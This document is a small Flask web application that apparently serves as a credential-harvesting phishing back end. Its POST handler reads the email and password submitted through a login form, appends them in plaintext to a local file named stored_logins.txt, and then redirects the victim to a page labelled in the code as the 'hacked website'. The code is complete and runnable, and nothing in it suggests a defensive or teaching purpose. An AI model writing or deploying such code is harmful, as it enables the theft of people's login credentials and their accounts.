from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/hehe_redir_fixed', methods=['POST', 'GET'])
def hehe_redir_fixed():
    if request.method == 'POST':
        # Handle POST request logic
        email = request.form['email']
        password = request.form['password']

        # Save the login data to a file or database
        with open('stored_logins.txt', 'a') as f:
            f.write(f'Email: {email}, Password: {password}\n')

        # Redirect to the hacked website or any other page
        return redirect(url_for('hacked_website_fixed'))
    else:
        # Handle GET request logic
        return render_template('hehe_redir_fixed.html')

@app.route('/hackedwebsite_fixed')
def hacked_website_fixed():
    return render_template('hackedwebsite_fixed.html')

@app.route('/hehe_fixed')
def hehe_fixed():
    return render_template('hehe_fixed.html')

if __name__ == '__main__':
    app.run(port=8000)

